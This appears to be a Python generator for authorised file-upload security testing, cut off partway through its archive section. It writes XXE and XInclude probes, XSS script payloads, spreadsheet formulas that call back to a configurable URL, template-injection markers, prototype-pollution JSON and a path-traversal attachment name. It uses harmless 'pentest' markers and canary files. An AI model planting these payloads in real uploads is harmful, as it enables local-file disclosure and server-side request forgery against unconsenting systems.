#!/usr/bin/env python3
"""Build configurable upload probes; never execute them or contact their URLs."""

import argparse
import copy
import csv
import hashlib
import io
import json
import re
import stat
import sys
import warnings
import zipfile
from pathlib import Path
from urllib.parse import urlparse
from xml.sax.saxutils import escape, quoteattr

sys.dont_write_bytecode = True

ROOT = Path(__file__).resolve().parents[1]
OFF = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
S = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
REL = "http://schemas.openxmlformats.org/package/2006/relationships"
CT = "http://schemas.openxmlformats.org/package/2006/content-types"
XMP = "http://ns.adobe.com/xap/1.0/\x00".encode()
XSS = '<script>alert("pentest")</script>'
SOURCES = {
    "upload": "https://portswigger.net/web-security/file-upload",
    "xxe": "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
    "tika": "https://www.cve.org/CVERecord?id=CVE-2025-66516",
    "ooxml": "https://solr.apache.org/security-news2.html",
    "svg": "https://xmlgraphics.apache.org/security.html",
    "html_pdf": "https://doc.courtbouillon.org/weasyprint/stable/first_steps.html#security",
    "zip": "https://security.snyk.io/research/zip-slip-vulnerability/",
    "symlink": "https://codeql.github.com/codeql-query-help/go/go-unsafe-unzip-symlink/",
    "csv": "https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/21-CSV_Injection/",
    "json": "https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution",
    "duplicates": "https://www.rfc-editor.org/rfc/rfc8259#section-4",
    "xslt": "https://lxml.de/resolvers.html#i-o-access-control-in-xslt",
    "pdf_extract": "https://pdfbox.apache.org/security.html",
    "resource": "https://pillow.readthedocs.io/en/stable/reference/Image.html",
    "webservice": "https://support.microsoft.com/en-us/excel/functions/webservice-function",
}


def zip_bytes(parts):
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in parts.items():
            zi = zipfile.ZipInfo(name, (2026, 1, 1, 0, 0, 0))
            zi.compress_type = zipfile.ZIP_DEFLATED
            zi.external_attr = 0o100644 << 16
            z.writestr(zi, data)
    return out.getvalue()


def parts_from(data):
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        return {n: z.read(n) for n in z.namelist()}


def xml_probe(uri, *, root="value", body=None, blind=False):
    declaration = '<?xml version="1.0" encoding="UTF-8"?>\n'
    if blind:
        dtd = f'<!DOCTYPE {root} SYSTEM {quoteattr(uri)}>\n'
        body = body or f"<{root}>pentest</{root}>"
    else:
        dtd = f'<!DOCTYPE {root} [<!ENTITY probe SYSTEM {quoteattr(uri)}>]>\n'
        body = body or f"<{root}>pentest &probe;</{root}>"
    return (declaration + dtd + body + "\n").encode()


def with_dtd(data, root, uri):
    text = data.decode("utf-8-sig")
    text = re.sub(r"^<\?xml[^>]*\?>\s*", "", text)
    return (f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root} [<!ENTITY probe SYSTEM {quoteattr(uri)}>]>\n' + text).encode()


def add_relationship(parts, name, rid, kind, target, external=True):
    # String-level edits deliberately preserve OOXML prefixes and DTD probes.
    text = parts.get(name, f'<Relationships xmlns="{REL}"></Relationships>'.encode()).decode("utf-8-sig")
    mode = ' TargetMode="External"' if external else ""
    item = f'<Relationship Id="{rid}" Type="{OFF}/{kind}" Target={quoteattr(target)}{mode}/>'
    if text.rstrip().endswith("/>"):
        text = re.sub(r"/>(\s*)$", r"></Relationships>\1", text)
    parts[name] = text.replace("</Relationships>", item + "</Relationships>").encode()


def add_content_type(parts, name, content_type):
    text = parts["[Content_Types].xml"].decode("utf-8-sig")
    parts["[Content_Types].xml"] = text.replace(
        "</Types>", f'<Override PartName="/{name}" ContentType="{content_type}"/></Types>'
    ).encode()


class Builder:
    def __init__(self, root, config):
        self.root = root
        self.config = config
        self.manifest = json.loads((root / "manifest.json").read_text())
        self.cases = {e["path"]: e for e in self.manifest["cases"]}
        self.generated = set()

    def url(self, case):
        return self.config["callback_base"].rstrip("/") + "/" + case

    def base(self, ext):
        return (self.root / ext / "valid" / ("pentest." + ext)).read_bytes()

    def emit(self, ext, name, data, kind, *, stage="parse", processor="Application-specific processor",
             requires="The application processes the relevant feature of an uploaded file.",
             evidence="Record a processing result specific to this case.", trigger=None,
             actor="server", interaction="none", actual=None, validity="valid",
             refs=("upload",), notes="", limits=None, callback=None, canary=False,
             risk="medium", destructive=False, proof="capability-probe", version="Feature/configuration dependent; no universal exploit claim."):
        rel = f"{ext}/malicious/{name}"
        if isinstance(data, str):
            data = data.encode()
        p = self.root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
        self.generated.add(rel)
        e = self.cases.get(rel, {})
        e.update({
            "path": rel, "extension": ext, "category": "malicious",
            "actual_format": actual or {
                "jpg":"image/jpeg", "jpeg":"image/jpeg", "png":"image/png", "gif":"image/gif", "bmp":"image/bmp", "webp":"image/webp",
                "pdf":"application/pdf", "svg":"image/svg+xml", "xml":"application/xml", "json":"application/json", "csv":"text/csv", "txt":"text/plain", "html":"text/html",
                "docx":"Office Open XML Word document", "xlsx":"Office Open XML spreadsheet", "zip":"application/zip",
                "php":"PHP source", "phtml":"PHP source", "jsp":"JSP source", "aspx":"ASP.NET Framework Web Forms source", "cfm":"CFML source",
            }[ext], "structural_validity": validity,
            "payload_type": kind, "risk_level": risk, "destructive": destructive,
            "visible_marker": "pentest", "expected_impact": evidence,
            "suggested_upload_filename": name, "size_bytes": len(data),
            "sha256": hashlib.sha256(data).hexdigest(), "processing_stage": stage,
            "target_processor": processor, "version_scope": version,
            "prerequisites": requires, "trigger": trigger or stage,
            "expected_evidence": evidence, "affected_actor": actor,
            "user_interaction": interaction, "callback_url": callback,
            "canary_uri": self.config["canary_uri"] if canary else None,
            "limits": limits or {}, "proof_strength": proof,
            "verification_status": "Static structure checked; target runtime behavior not certified.",
            "references": [SOURCES.get(k, k) for k in refs], "notes": notes,
            "build_origin": "tools/build_payloads.py",
        })
        self.cases[rel] = e

    def xxe_args(self, ext, uri, local):
        return dict(processor=f"{ext.upper()} XML parser with external entities enabled",
                    requires="DTD/entity resolution enabled; local-file/network access allowed; the affected XML part must actually be parsed.",
                    evidence="A target-side canary value absent from the uploaded file appears in parsed output." if local else "A correlated HTTP request from the processing host; response text can appear in parsed output.",
                    refs=("xxe", "tika" if ext == "pdf" else "ooxml" if ext in ("docx", "xlsx") else "svg" if ext == "svg" else "xxe"),
                    callback=None if local else uri, canary=local,
                    version={"pdf":"PDF/XFA parser with unsafe entity resolution; CVE-2025-66516 is a Tika-specific example, not a universal PDF exploit.",
                             "docx":"Unsafe OOXML XML processing; historical example CVE-2014-3529 in Apache POI.",
                             "xlsx":"Unsafe OOXML XML processing; historical example CVE-2014-3529 in Apache POI.",
                             "svg":"SVG XML parser with external entities enabled; affected processor/version must be established."}.get(ext,"XML parser with external entities enabled; affected configuration must be established."),
                    notes="This is an XXE probe, not a claim that modern parsers resolve entities by default. Serve XML-safe plain text at HTTP entity URLs.")

    def build_xml_svg(self):
        svg_body = ('<svg xmlns="http://www.w3.org/2000/svg" width="640" height="320" viewBox="0 0 640 320">'
                    '<rect width="640" height="320" fill="white"/>'
                    '<text x="320" y="180" text-anchor="middle" font-size="84">pentest &probe;</text></svg>')
        for ext in ("xml", "svg"):
            for mode, uri, local in [("local-canary", self.config["canary_uri"], True),
                                     ("http-callback", self.url(f"{ext}-xxe-http"), False)]:
                self.emit(ext, f"xxe-{mode}.{ext}", xml_probe(uri, root="svg" if ext == "svg" else "value", body=svg_body if ext == "svg" else None),
                          "xxe-local-canary" if local else "xxe-http-callback", **self.xxe_args(ext, uri, local))
            url = self.url(f"{ext}-external-dtd")
            body = svg_body.replace(" &probe;", "") if ext == "svg" else None
            self.emit(ext, f"external-dtd-callback.{ext}", xml_probe(url, root="svg" if ext == "svg" else "value", body=body, blind=True),
                      "external-dtd-fetch", processor="XML parser loading external DTDs",
                      requires="External DTD loading is enabled; callback endpoint returns a valid or empty DTD.",
                      evidence="Correlated DTD fetch from processing host; this alone proves fetching, not file disclosure.", callback=url, refs=("xxe",))
        for mode, uri in [("local-canary", self.config["canary_uri"]), ("http-callback", self.url("xml-xinclude"))]:
            data = f'<value xmlns:xi="http://www.w3.org/2001/XInclude">pentest <xi:include href={quoteattr(uri)} parse="text"/></value>\n'
            self.emit("xml", f"xinclude-{mode}.xml", data, "xinclude-resource", processor="XML pipeline explicitly applying XInclude",
                      requires="Application explicitly invokes XInclude with file/network access enabled.",
                      evidence="Canary included in expanded XML, or correlated target-side resource fetch.",
                      refs=("xxe",), callback=uri if mode.startswith("http") else None, canary=mode.startswith("local"))
        url = self.url("xml-xslt-document")
        xslt = (f'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
                f'<xsl:template match="/"><value>pentest<xsl:copy-of select={quoteattr("document('" + url + "')")}/></value>'
                '</xsl:template></xsl:stylesheet>\n')
        self.emit("xml", "xslt-document-callback.xml", xslt, "xslt-resource-fetch", stage="transform",
                  processor="XSLT 1.0 engine treating this file as the stylesheet", requires="Attacker-supplied stylesheets are accepted and document() network reads are allowed.",
                  evidence="Correlated callback during transformation; endpoint must return well-formed XML.", refs=("xslt",), callback=url)
        declarations = ['<!ENTITY p0 "pentest">']
        for i in range(1, 5):
            declarations.append(f'<!ENTITY p{i} "' + (f'&p{i-1};' * 4) + '">')
        self.emit("xml", "entity-expansion-bounded.xml", '<!DOCTYPE value [' + ''.join(declarations) + ']><value>&p4;</value>\n',
                  "bounded-entity-expansion", processor="XML entity-expanding parser", evidence="Observe expansion/rejection and enforced limits; 256 markers do not demonstrate a service outage.",
                  limits={"expanded_text_bytes": 1792, "entity_depth": 5}, refs=("xxe",), proof="limit-probe", risk="low")
        url = self.url("svg-external-image")
        svg = self.base("svg").decode().replace("</svg>", f'<image href={quoteattr(url)} x="0" y="0" width="1" height="1"/></svg>')
        self.emit("svg", "external-image-callback.svg", svg, "external-resource-fetch", stage="render",
                  processor="SVG document renderer/rasterizer permitting external images", requires="External resource loading is enabled in a document/rasterizer context.",
                  evidence="Correlated callback; distinguish server-side rendering from a user browser request.", callback=url, actor="renderer host or viewer", refs=("svg",))
        self.emit("svg", "script-element.svg", self.base("svg").decode().replace("</svg>", '<script>alert("pentest")</script></svg>'),
                  "stored-xss-script-element", stage="serve/open", processor="Active SVG document context",
                  requires="SVG served in an active document context without an effective script restriction; img contexts normally disable scripts.",
                  evidence="pentest alert in the tested document origin.", actor="viewer", refs=("svg",))

    def build_html_text_json(self):
        base = '<!doctype html><meta charset="utf-8"><title>pentest</title><p>pentest</p>'
        url = self.url("html-external-image")
        self.emit("html", "external-resource-callback.html", base + f'<img src={quoteattr(url)} alt="pentest">\n', "external-resource-fetch",
                  stage="render", processor="Browser or HTML renderer permitting external resources",
                  evidence="Correlated request; classify SSRF only when the server crosses an intended network boundary.", callback=url, actor="renderer host or viewer", refs=("html_pdf",))
        self.emit("html", "local-file-frame.html", base + f'<iframe src={quoteattr(self.config["canary_uri"])}></iframe>\n', "renderer-local-file-read",
                  stage="render", processor="HTML renderer supporting frames and local file access", requires="Local-file access is allowed and the renderer supports this frame type; not universal across HTML-to-PDF engines.",
                  evidence="Canary contents included in rendered output; missing/broken frame is not success.", canary=True, refs=("html_pdf",))
        self.emit("html", "pdf-attachment-local-canary.html", base + f'<link rel="attachment" href={quoteattr(self.config["canary_uri"])} title="pentest">\n',
                  "renderer-local-file-attachment", stage="HTML-to-PDF", processor="WeasyPrint with attachment fetching permitted",
                  requires="Renderer supports rel=attachment and can read the configured local canary.",
                  evidence="Generated PDF contains the server-side canary as an embedded attachment.", canary=True, refs=("html_pdf",))
        for ext in ("html", "txt"):
            data = (base.replace("<p>pentest</p>", "<p>{{ 'pen' ~ 'test' }}</p>") if ext == "html" else "{{ 'pen' ~ 'test' }}") + "\n"
            self.emit(ext, f"ssti-jinja-marker.{ext}", data, "template-evaluation-marker", stage="template-render",
                      processor="Jinja-compatible template engine", requires="Uploaded contents are compiled as template source, rather than passed as data.",
                      evidence="Template expression is replaced by pentest; this proves evaluation, not OS command execution.", proof="evaluation-probe")
        self.emit("txt", "html-reflection.txt", '<p>pentest</p>' + XSS + "\n", "html-reflection-input", stage="preview",
                  processor="Text preview that inserts text into active HTML without escaping", requires="The application interprets text as markup instead of plain text.",
                  evidence="pentest alert in the preview origin; rendering the file as plain text is safe handling.", actor="viewer")
        self.emit("json", "prototype-constructor.json", '{"value":"pentest","constructor":{"prototype":{"pentest":"pentest"}}}\n',
                  "prototype-pollution-constructor", processor="Unsafe recursive JavaScript merge",
                  requires="Application traverses constructor.prototype and writes inherited prototype properties.",
                  evidence="A separately created object inherits the injected pentest property, or equivalent application-specific effect.", refs=("json",))
        self.emit("json", "duplicate-keys.json", '{"value":"pentest","probe":false,"probe":true}\n', "duplicate-key-disagreement",
                  processor="Validator/backend using different duplicate-key policies", requires="Two consumers disagree on duplicate-key resolution and a security-relevant decision depends on it.",
                  evidence="Different consumers see different probe values; disagreement alone is not authorization bypass.", refs=("duplicates",), proof="parser-policy-probe", risk="low")
        obj = "pentest"
        for _ in range(64):
            obj = {"value": obj}
        self.emit("json", "depth-limit-bounded.json", json.dumps(obj, separators=(",", ":")) + "\n", "bounded-depth-probe",
                  processor="JSON import/parser depth limiter", evidence="Record handling of 64 object levels; no service-outage claim.", limits={"object_depth": 64}, refs=("duplicates",), proof="limit-probe", risk="low")

    def build_csv(self):
        url = self.url("csv-hyperlink")
        formulas = {
            "formula-injection.csv": f'=HYPERLINK("{url}","pentest")',
            "formula-marker.csv": '=CONCATENATE("pen","test")',
            "formula-http-callback.csv": f'=WEBSERVICE("{self.url("csv-webservice")}")',
            "formula-tab-prefix.csv": '\t=CONCATENATE("pen","test")',
        }
        for name, formula in formulas.items():
            out = io.StringIO(newline="")
            writer = csv.writer(out, lineterminator="\n")
            writer.writerows([["value"], [formula]])
            callback = self.url("csv-webservice") if "http-callback" in name else url if name == "formula-injection.csv" else None
            self.emit("csv", name, out.getvalue(), "formula-injection", stage="spreadsheet-open/recalculate",
                      processor="Spreadsheet importer with formula evaluation enabled",
                      requires="CSV imported as one comma-delimited field. WEBSERVICE requires a supporting client such as Excel for Windows; tab handling is client-dependent.",
                      evidence="Computed pentest, clicked hyperlink, or correlated formula network request, as appropriate; no OS execution claim.",
                      callback=callback, actor="spreadsheet host", interaction="click link" if name == "formula-injection.csv" else "open/import/recalculate", refs=("csv", "webservice"),
                      notes="Correct CSV quoting preserves the entire formula in one cell. Callback endpoints should return plain pentest for WEBSERVICE.")

    def build_office(self):
        for ext in ("docx", "xlsx"):
            base = parts_from(self.base(ext))
            for mode, uri, local in [("local-canary", self.config["canary_uri"], True), ("http-callback", self.url(f"{ext}-xxe-http"), False)]:
                parts = base.copy()
                if ext == "docx":
                    doc = parts["word/document.xml"].replace(b">pentest</w:t>", b">pentest &probe;</w:t>")
                    parts["word/document.xml"] = with_dtd(doc, "w:document", uri)
                else:
                    data = (f'<x:sst xmlns:x="{S}" count="1" uniqueCount="1"><x:si><x:t>pentest &probe;</x:t></x:si></x:sst>').encode()
                    parts["xl/sharedStrings.xml"] = with_dtd(data, "x:sst", uri)
                    sheet = parts["xl/worksheets/sheet1.xml"].decode()
                    parts["xl/worksheets/sheet1.xml"] = sheet.replace('t="str"', 't="s"').replace('<x:v>pentest</x:v>', '<x:v>0</x:v>').encode()
                self.emit(ext, f"xxe-{mode}.{ext}", zip_bytes(parts), "ooxml-xxe-local-canary" if local else "ooxml-xxe-http",
                          validity="zip-valid; xml-well-formed; contains-DTD-not-permitted-by-OPC", **self.xxe_args(ext, uri, local))
        parts = parts_from(self.base("docx"))
        url = self.url("docx-external-image")
        add_relationship(parts, "word/_rels/document.xml.rels", "rIdProbe", "image", url)
        drawing = ('<w:r><w:drawing><wp:inline xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing">'
                   '<wp:extent cx="9525" cy="9525"/><wp:docPr id="10" name="pentest"/>'
                   '<a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">'
                   '<a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">'
                   '<pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">'
                   '<pic:nvPicPr><pic:cNvPr id="10" name="pentest"/><pic:cNvPicPr/></pic:nvPicPr>'
                   '<pic:blipFill><a:blip r:link="rIdProbe"/><a:stretch><a:fillRect/></a:stretch></pic:blipFill>'
                   '<pic:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="9525" cy="9525"/></a:xfrm>'
                   '<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></pic:spPr></pic:pic>'
                   '</a:graphicData></a:graphic></wp:inline></w:drawing></w:r>')
        parts["word/document.xml"] = parts["word/document.xml"].replace(b"</w:p>", drawing.encode() + b"</w:p>", 1)
        self.emit("docx", "external-image-callback.docx", zip_bytes(parts), "ooxml-external-image", stage="render/update-links",
                  processor="Word/Office renderer allowing linked images", requires="External image links are updated; URL must return a supported image for successful rendering.",
                  evidence="Correlated external image request; classify the source as viewer or server renderer.", callback=url, actor="renderer host or viewer", refs=("ooxml",))
        parts = parts_from(self.base("docx")); url = self.url("docx-template")
        add_relationship(parts, "word/_rels/settings.xml.rels", "rIdProbeTemplate", "attachedTemplate", url)
        settings = parts["word/settings.xml"].decode()
        parts["word/settings.xml"] = settings.replace("</w:settings>", '<w:attachedTemplate r:id="rIdProbeTemplate"/></w:settings>').encode()
        self.emit("docx", "external-template-callback.docx", zip_bytes(parts), "ooxml-external-template", stage="open/template-load",
                  processor="Word/Office renderer loading attached templates", requires="Attached-template loading is allowed; serve an actual supported template to complete loading.",
                  evidence="Correlated template request; template loading itself does not prove macro or OS execution.", callback=url, actor="renderer host or viewer", refs=("ooxml",))
        parts = parts_from(self.base("docx"))
        field_path = self.config["canary_path"].replace('\\', '\\\\').replace('"', '\\"')
        field = f' INCLUDETEXT "{field_path}" '
        text = parts["word/document.xml"].decode()
        cached_run = re.search(r"<w:r>.*?</w:r>", text).group(0)
        replacement = f'<w:fldSimple w:instr={quoteattr(field)}>' + cached_run + '</w:fldSimple>'
        text = re.sub(r"<w:r>.*?</w:r>", lambda match: replacement, text, count=1)
        parts["word/document.xml"] = text.encode()
        self.emit("docx", "field-includetext-canary.docx", zip_bytes(parts), "ooxml-field-local-file", stage="field-update/render",
                  processor="Office renderer implementing INCLUDETEXT fields", requires="Fields are updated and the configured local canary path is readable. Cached pentest is only a placeholder.",
                  evidence="Server/viewer-local canary contents replace the cached field result; merely seeing pentest is not proof.", canary=True, actor="renderer host or viewer", refs=("ooxml",))
        for name, formula, callback, interaction in [
            ("formula-marker.xlsx", 'CONCATENATE("pen","test")', None, "recalculate"),
            ("formula-http-callback.xlsx", f'WEBSERVICE("{self.url("xlsx-webservice")}")', self.url("xlsx-webservice"), "recalculate"),
            ("external-hyperlink.xlsx", f'HYPERLINK("{self.url("xlsx-hyperlink")}","pentest")', self.url("xlsx-hyperlink"), "click link"),
        ]:
            parts = parts_from(self.base("xlsx"))
            text = parts["xl/worksheets/sheet1.xml"].decode()
            parts["xl/worksheets/sheet1.xml"] = text.replace('<x:v>pentest</x:v>', f'<x:f>{escape(formula)}</x:f><x:v>pentest</x:v>').encode()
            wb = parts["xl/workbook.xml"].decode()
            parts["xl/workbook.xml"] = wb.replace('</x:workbook>', '<x:calcPr calcId="0" fullCalcOnLoad="1" forceFullCalc="1"/></x:workbook>').encode()
            self.emit("xlsx", name, zip_bytes(parts), "spreadsheet-formula", stage="spreadsheet-open/recalculate", processor="Spreadsheet formula engine",
                      requires="Formula support and external content policy permit the operation. WEBSERVICE is not supported by every client.",
                      evidence="Recalculated result or correlated request/click. Cached pentest alone is not formula-evaluation proof.",
                      callback=callback, actor="spreadsheet host", interaction=interaction, refs=("csv", "webservice"))
        # Keep the original DOCX hyperlink fixture but make its URL configurable.
        parts = parts_from((self.root / 'docx/malicious/external-hyperlink.docx').read_bytes())
        text = parts['word/_rels/document.xml.rels'].decode()
        text = re.sub(r'(Type="' + re.escape(OFF) + r'/hyperlink" Target=)"[^"]*"', lambda m: m[1] + quoteattr(self.url("docx-hyperlink")), text)
        parts['word/_rels/document.xml.rels'] = text.encode()
        self.emit("docx", "external-hyperlink.docx", zip_bytes(parts), "external-link", stage="click-link", processor="Word hyperlink handler",
                  evidence="User-initiated navigation only; accepting this file is not by itself a vulnerability.", callback=self.url("docx-hyperlink"), actor="viewer", interaction="click link", refs=("ooxml",), proof="policy-probe", risk="low")

    def build_pdf(self):
        from pypdf import PdfReader, PdfWriter
        from pypdf.generic import ArrayObject, BooleanObject, DictionaryObject, FloatObject, NameObject, NumberObject, TextStringObject, DecodedStreamObject

        def writer():
            w = PdfWriter()
            w.append(PdfReader(io.BytesIO(self.base("pdf"))))
            return w

        def dump(w):
            out = io.BytesIO(); w.write(out); return out.getvalue()

        def stream(w, data):
            s = DecodedStreamObject(); s.set_data(data); return w._add_object(s)

        w = writer(); url = self.url("pdf-uri-link")
        annotation = DictionaryObject({NameObject('/Type'): NameObject('/Annot'), NameObject('/Subtype'): NameObject('/Link'),
            NameObject('/Rect'): ArrayObject([FloatObject(x) for x in [220, 380, 400, 440]]),
            NameObject('/Border'): ArrayObject([NumberObject(0)] * 3),
            NameObject('/A'): DictionaryObject({NameObject('/S'): NameObject('/URI'), NameObject('/URI'): TextStringObject(url)})})
        w.pages[0][NameObject('/Annots')] = ArrayObject([w._add_object(annotation)])
        self.emit("pdf", "uri-link.pdf", dump(w), "pdf-uri-action", stage="click-link", processor="PDF viewer URI action handler",
                  evidence="Navigation/callback after clicking pentest; a client click is not server-side SSRF.", callback=url, actor="viewer", interaction="click link", proof="policy-probe", risk="low")
        w = writer(); url = self.url("pdf-submit-form")
        field = DictionaryObject({NameObject('/FT'): NameObject('/Tx'), NameObject('/T'): TextStringObject('value'), NameObject('/V'): TextStringObject('pentest')})
        field_ref = w._add_object(field)
        action = DictionaryObject({NameObject('/S'): NameObject('/SubmitForm'), NameObject('/F'): TextStringObject(url), NameObject('/Flags'): NumberObject(4), NameObject('/Fields'): ArrayObject([field_ref])})
        button = DictionaryObject({NameObject('/Type'): NameObject('/Annot'), NameObject('/Subtype'): NameObject('/Widget'), NameObject('/FT'): NameObject('/Btn'),
            NameObject('/Ff'): NumberObject(65536), NameObject('/T'): TextStringObject('pentest'),
            NameObject('/Rect'): ArrayObject([FloatObject(x) for x in [220, 380, 400, 440]]), NameObject('/A'): action,
            NameObject('/MK'): DictionaryObject({NameObject('/CA'): TextStringObject('pentest')})})
        appearance = DecodedStreamObject(); appearance.set_data(b'q 1 1 1 rg 0 0 180 60 re f Q')
        appearance.update({NameObject('/Type'): NameObject('/XObject'), NameObject('/Subtype'): NameObject('/Form'), NameObject('/BBox'): ArrayObject([NumberObject(x) for x in [0, 0, 180, 60]])})
        # Transparent appearance preserves the underlying pentest page text.
        appearance.set_data(b'q Q')
        button[NameObject('/AP')] = DictionaryObject({NameObject('/N'): w._add_object(appearance)})
        button_ref = w._add_object(button)
        w.pages[0][NameObject('/Annots')] = ArrayObject([button_ref])
        w._root_object[NameObject('/AcroForm')] = w._add_object(DictionaryObject({NameObject('/Fields'): ArrayObject([field_ref, button_ref])}))
        self.emit("pdf", "submit-form-button.pdf", dump(w), "pdf-form-submit", stage="form-submit", processor="PDF viewer implementing SubmitForm actions",
                  requires="User activates the pentest area and viewer policy allows form submission.", evidence="Request containing only the pentest form value; no other fields or document contents are submitted.",
                  callback=url, actor="viewer", interaction="click pentest form button", proof="policy-probe")
        for mode, uri, local in [("local-canary", self.config["canary_uri"], True), ("http-callback", self.url("pdf-xfa-http"), False)]:
            w = writer()
            body = ('<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">'
                    '<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/"><xfa:data>'
                    '<value>pentest &probe;</value></xfa:data></xfa:datasets></xdp:xdp>')
            xfa = stream(w, xml_probe(uri, root="xdp:xdp", body=body))
            w._root_object[NameObject('/AcroForm')] = w._add_object(DictionaryObject({NameObject('/Fields'): ArrayObject(), NameObject('/XFA'): xfa, NameObject('/NeedAppearances'): BooleanObject(False)}))
            self.emit("pdf", f"xfa-xxe-{mode}.pdf", dump(w), "pdf-xfa-xxe", **self.xxe_args("pdf", uri, local))
        for name, attached_name, kind in [("embedded-file.pdf", "pentest.txt", "pdf-embedded-file"),
                                           ("embedded-path-traversal.pdf", "../pentest-extracted-marker.txt", "pdf-attachment-path-traversal")]:
            w = writer(); w.add_attachment(attached_name, b'pentest\n')
            self.emit("pdf", name, dump(w), kind, stage="extract-attachments", processor="PDF embedded-file extractor",
                      requires="For traversal, attachment names are used as filesystem paths without confinement. Merely storing/opening the PDF is not extraction.",
                      evidence="Attachment detected, or marker written outside a disposable extraction directory for the traversal case.",
                      refs=("pdf_extract",), destructive="traversal" in name, notes="Extraction can overwrite an existing marker file; use a disposable extraction parent.", proof="policy-probe" if name == "embedded-file.pdf" else "capability-probe")
        w = writer(); w.add_metadata({'/Title': XSS, '/Subject': 'pentest'})
        self.emit("pdf", "metadata-xss.pdf", dump(w), "metadata-injection", stage="metadata-preview", processor="Metadata extractor followed by unsafe HTML output",
                  requires="Metadata is rendered into HTML without correct escaping.", evidence="pentest alert in the metadata preview origin; PDF metadata extraction alone is not XSS.", actor="viewer")

    def build_images(self):
        from PIL import Image, PngImagePlugin
        def xmp_text(text):
            return ('<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
                    '<rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:description><rdf:Alt>'
                    '<rdf:li xml:lang="x-default">' + text + '</rdf:li></rdf:Alt></dc:description></rdf:Description></rdf:RDF></x:xmpmeta>')

        def jpeg_segment(base, marker, value):
            if len(value) + 2 > 65535: raise ValueError('JPEG segment too large')
            return base[:2] + bytes([255, marker]) + (len(value) + 2).to_bytes(2, 'big') + value + base[2:]

        meta_notes = "The original bitmap remains the visible marker. Only unsafe interpretation of extracted text as HTML creates XSS. XML/XMP XXE requires an unsafe downstream XML consumer."
        for ext in ("jpg", "jpeg", "gif", "webp"):
            im = Image.open(io.BytesIO(self.base(ext)))
            out = io.BytesIO()
            if ext in ("jpg", "jpeg"):
                exif = Image.Exif(); exif[0x010e] = XSS; exif[0x9286] = b'ASCII\x00\x00\x00' + XSS.encode()
                im.save(out, format='JPEG', quality=92, exif=exif)
                name = 'exif-metadata-xss.' + ext
            elif ext == 'gif':
                im.save(out, format='GIF', comment=XSS.encode()); name = 'metadata-xss.gif'
            else:
                im.save(out, format='WEBP', lossless=True, xmp=xmp_text(escape(XSS)).encode()); name = 'metadata-xss.webp'
            self.emit(ext, name, out.getvalue(), 'metadata-injection', stage='metadata-preview', processor='Metadata extractor followed by unsafe HTML output',
                      evidence='Extracted script text reaches an HTML sink and triggers a pentest alert; no claim that viewing the image executes it.', actor='viewer', notes=meta_notes)
        for ext in ('jpg', 'jpeg', 'png', 'webp'):
            body = xmp_text('pentest &probe;')
            xmp = xml_probe(self.config['canary_uri'], root='x:xmpmeta', body=body)
            if ext in ('jpg', 'jpeg'):
                data = jpeg_segment(self.base(ext), 0xe1, XMP + xmp)
            else:
                im = Image.open(io.BytesIO(self.base(ext))); out = io.BytesIO()
                if ext == 'png':
                    meta = PngImagePlugin.PngInfo(); meta.add_itxt('XML:com.adobe.xmp', xmp.decode())
                    im.save(out, format='PNG', pnginfo=meta)
                else: im.save(out, format='WEBP', lossless=True, xmp=xmp)
                data = out.getvalue()
            self.emit(ext, 'xmp-xxe-local-canary.' + ext, data, 'xmp-xxe-probe', stage='metadata-xml-parse',
                      processor='Application extracting raw XMP and parsing it with external entities enabled',
                      requires='Raw XMP is actually passed to an unsafe XML parser. Generic image decoding is not sufficient and no specific decoder CVE is claimed.',
                      evidence='Canary content appears in expanded XMP; preserving or reporting the entity text is not success.', canary=True, refs=('xxe',), notes=meta_notes,
                      validity='image-valid; contains-XMP-XML-with-DTD-probe')
        for ext in ('gif', 'png', 'webp'):
            im = Image.open(io.BytesIO(self.base(ext))).convert('RGB')
            frames = []
            for i in range(8):
                frame = im.copy(); frame.putpixel((i, 0), (0, 0, 0)); frames.append(frame)
            out = io.BytesIO()
            kwargs = dict(format={'gif':'GIF','png':'PNG','webp':'WEBP'}[ext], save_all=True, append_images=frames[1:], duration=100, loop=0)
            if ext == 'webp': kwargs['lossless'] = True
            frames[0].save(out, **kwargs)
            self.emit(ext, 'frame-count-bounded.' + ext, out.getvalue(), 'bounded-frame-count', stage='decode/thumbnail',
                      processor='Animated image decoder or thumbnail pipeline', evidence='Record handling of eight frames and enforcement of frame limits; this is not an outage payload.',
                      limits={'frames':8,'width':640,'height':320,'total_frame_pixels':1638400}, refs=('resource',), proof='limit-probe', risk='low')
        for ext in ('bmp', 'gif', 'jpg', 'jpeg', 'png', 'webp'):
            im = Image.open(io.BytesIO(self.base(ext))).convert('RGB').resize((1024, 1024))
            out = io.BytesIO(); im.save(out, format={'jpg':'JPEG','jpeg':'JPEG'}.get(ext, ext.upper()))
            self.emit(ext, 'dimensions-bounded.' + ext, out.getvalue(), 'bounded-image-dimensions', stage='decode/thumbnail',
                      processor='Image decoder / business dimension validator', evidence='Record treatment of 1024x1024 images; no claim of a decompression bomb or decoder exploit.',
                      limits={'width':1024,'height':1024,'pixels':1048576}, refs=('resource',), proof='limit-probe', risk='low')

    def build_archives(self):
